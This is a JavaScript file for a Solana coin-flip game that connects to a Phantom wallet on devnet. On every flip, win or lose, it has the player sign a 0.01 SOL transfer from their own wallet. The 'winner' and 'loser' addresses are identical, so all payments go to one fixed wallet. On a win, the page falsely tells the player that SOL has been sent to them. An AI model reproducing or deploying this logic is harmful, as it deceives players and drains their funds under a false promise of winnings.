let connection;
let userPublicKey;
const winnerWallet = "BvKeWCU3nsfW5VpzKhMd7atD5i5qeEQ2ga2t5coDagNr";  // Wallet for winner
const loserWallet = "BvKeWCU3nsfW5VpzKhMd7atD5i5qeEQ2ga2t5coDagNr";  // Wallet for loser

// Function to connect to Solana wallet (Phantom, etc.)
async function connectWallet() {
    if (window.solana && window.solana.isPhantom) {
        try {
            await window.solana.connect(); // Connect the wallet
            userPublicKey = window.solana.publicKey;
            document.getElementById("wallet-address").innerText = `Wallet connected: ${userPublicKey.toString()}`;
            document.getElementById("wallet-address").style.display = "block";
            document.getElementById("connect-wallet-btn").style.display = "none";
            document.getElementById("game-container").style.display = "block";

            // Create a connection to the Solana devnet (use 'mainnet-beta' for real transactions)
            connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('devnet'), 'confirmed');
        } catch (err) {
            console.log('Connection error: ', err);
        }
    } else {
        alert("Please install Phantom wallet.");
    }
}

// Function to flip the coin
async function flipCoin(choice) {
    const result = Math.random() < 0.5 ? "Heads" : "Tails";  // Random outcome
    const outcomeText = `The coin landed on: ${result}`;

    document.getElementById("result").innerText = outcomeText;

    // If the player wins, send SOL to the winner wallet, else to the loser wallet
    if (choice === result) {
        await sendSolToWallet(winnerWallet);
        document.getElementById("result").innerText += " You Win! SOL has been sent to your wallet.";
    } else {
        await sendSolToWallet(loserWallet);
        document.getElementById("result").innerText += " You Lose! SOL has been sent to the loser wallet.";
    }
}

// Function to send SOL to the specified wallet
async function sendSolToWallet(destinationWallet) {
    const transaction = new solanaWeb3.Transaction().add(
        solanaWeb3.SystemProgram.transfer({
            fromPubkey: userPublicKey,
            toPubkey: new solanaWeb3.PublicKey(destinationWallet),
            lamports: solanaWeb3.LAMPORTS_PER_SOL / 100, // Send 0.01 SOL (change as needed)
        })
    );

    const { blockhash } = await connection.getRecentBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = userPublicKey;

    const signedTransaction = await window.solana.signTransaction(transaction);
    const signature = await connection.sendRawTransaction(signedTransaction.serialize());

    // Confirm the transaction
    await connection.confirmTransaction(signature);
    console.log(`Transaction successful. Signature: ${signature}`);
}

// Attach event listeners to the buttons
document.getElementById("connect-wallet-btn").addEventListener("click", connectWallet);
document.getElementById("heads-btn").addEventListener("click", () => flipCoin("Heads"));
document.getElementById("tails-btn").addEventListener("click", () => flipCoin("Tails"));
